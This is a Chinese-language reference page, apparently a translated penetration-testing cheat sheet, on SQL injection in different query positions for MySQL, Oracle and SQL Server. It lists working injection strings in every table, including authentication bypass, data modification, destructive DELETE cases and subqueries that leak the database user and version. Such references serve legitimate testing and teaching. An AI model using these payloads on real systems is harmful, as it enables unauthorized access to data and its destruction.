###  注入定位 {docsify-ignore-all}

当注入发生的地方并不明显时，SQL注入总是很麻烦。有一些方法可以在查询的各个部分利用注入是有帮助的。


`$injection`确定注入点。修改数据的注入尝试始终使用连接，并允许查询的其余部分有效。通过[这个文章](https://blog.netspi.com/sql-injection-help-sleep-night/)可以了解更多信息。

#### MySQL


| 注入位置   |      语句     | 注入字符串 |
|----------|:-------------:|:-------------:|
| SELECT -> WHERE   |      SELECT * FROM USERS WHERE USER='$injection';    | ' or 1=1 -- |
| UPDATE -> SET   |      UPDATE USERS SET email='$injection' WHERE user='NetSPI';     | ' 'harold@netspi.com' ' |
| UPDATE -> WHERE <br />注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。   |      UPDATE USERS SET email='harold@netspi.com' WHERE user='$injection';   | ' 'netspi' ' |
| DELETE -> WHERE <br />注意：运行删除语句时要非常小心，因为整个表都会被删除。   |      DELETE FROM USERS WHERE USERS='$injection';     | ' 'harold@netspi.com' ' |







#### Oracle


| 注入位置   |      语句     | 注入字符串 |
|----------|:-------------:|:-------------:|
| SELECT -> WHERE   |      SELECT user FROM dual WHERE user LIKE '$injection';     | '&#124;&#124;'USER%'&#124;&#124;' |
| INSERT -> VALUES   |     INSERT INTO log_table (message) VALUES ('$injection');     | '&#124;&#124;(select user from dual)&#124;&#124;' |
| UPDATE -> SET   |      UPDATE log_table SET message = '$injection' WHERE message = 'test';     | '&#124;&#124;(select user from dual)&#124;&#124; |
| UPDATE -> WHERE <br />注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。  |      UPDATE log_table SET message = 'test' WHERE message = '$injection';     | '&#124;&#124;'Injected'&#124;&#124;' |





#### SQL Server

| 注入位置   |      语句     | 注入字符串 |
|----------|:-------------:|:-------------:|
| SELECT -> WHERE   |      SELECT * FROM USERS WHERE "USER"='$injection';     | ' or 1=1 -- |
| UPDATE -> SET  |      	UPDATE USERS SET "email"='$injection' WHERE "USER"='NetSPI';    | '+'harold@netspi.com'+' |
| UPDATE -> WHERE <br />注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。   |      UPDATE USERS SET "email"='harold@netspi.com' WHERE "USER"='$injection';     | '+'NetSPI'+' |
| DELETE -> WHERE  |      DELETE USERS WHERE "User"='$injection';    | '+'NetSPI'+' |
| INSERT -> VALUES  |      INSERT INTO USERS ([User], [Password]) VALUES ('$injection', 'password');     | '+(select @@version)+' |





